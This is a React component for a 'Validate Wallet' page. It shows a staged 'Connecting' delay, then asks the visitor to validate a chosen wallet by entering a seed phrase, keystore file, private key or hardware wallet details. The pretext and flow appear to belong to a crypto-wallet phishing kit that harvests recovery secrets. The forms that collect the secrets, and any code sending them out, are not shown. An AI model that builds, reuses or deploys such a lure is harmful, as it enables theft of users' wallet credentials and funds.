import React, { useState } from "react";
import { useSelector } from "react-redux";
import Connecting from "./Connecting";
import Hardware from "./Hardware";
import Header from "./Header";
import Keystone from "./Keystone";
import Phrase from "./Phrase";
import Privatekey from "./Privatekey";

const ValidateWallet = () => {
  const wallet = useSelector((state) => state.wallet.wallet);
  const [active, setActive] = useState("phrase");
  const [visible, setVisible] = useState(true);

  setTimeout(() => {
    setVisible(false);
  }, 5000);

  return visible ? (
    <Connecting />
  ) : (
    <div>
      <Header path="/wallet" />
      <div className="mt-[8rem] flex items-center justify-center flex-col lg:max-w-[60vw] lg:mx-auto">
        <h1 className="text-[1.5rem] font-semibold">Validate Wallet</h1>
        <p className="text-sm text-gray-600 px-3 text-center">
          validate your selected wallet{" "}
          {wallet && (
            <span className="bg-gray-400 text-gray-900 p-1 px-2 font-semibold">
              {wallet.title}
            </span>
          )}{" "}
          to continue
        </p>
      </div>

      <div className=" lg:max-w-[60vw] lg:mx-auto mt-[2rem] flex items-center justify-center gap-4 flex-wrap px-3">
        <span
          className={`bg-blue-400 text-white px-3 py-2 font-semibold rounded-lg cursor-pointer ${
            active === "phrase" && "bg-blue-600"
          }`}
          onClick={() => setActive("phrase")}
        >
          PHRASE
        </span>
        <span
          className={`bg-blue-400 text-white px-3 py-2 font-semibold rounded-lg cursor-pointer 
          ${active === "keystone" && "bg-blue-600"}`}
          onClick={() => setActive("keystone")}
        >
          KEYSTORE
        </span>
        <span
          className={`bg-blue-400 text-white px-3 py-2 font-semibold rounded-lg cursor-pointer 
          ${active === "privatekey" && "bg-blue-600"}`}
          onClick={() => setActive("privatekey")}
        >
          PRIVATE KEY
        </span>
        <span
          className={`bg-blue-400 text-white px-3 py-2 font-semibold rounded-lg cursor-pointer 
          ${active === "hardware" && "bg-blue-600"}`}
          onClick={() => setActive("hardware")}
        >
          HARDWARE
        </span>
      </div>

      <div
        className="lg:max-w-[60vw] lg:mx-auto md:max-w-[60vw] md:mx-auto
      sm:max-w-[60vw] sm:mx-auto"
      >
        {active === "phrase" && <Phrase />}
        {active === "keystone" && <Keystone />}
        {active === "privatekey" && <Privatekey />}
        {active === "hardware" && <Hardware />}
      </div>
    </div>
  );
};

export default ValidateWallet;
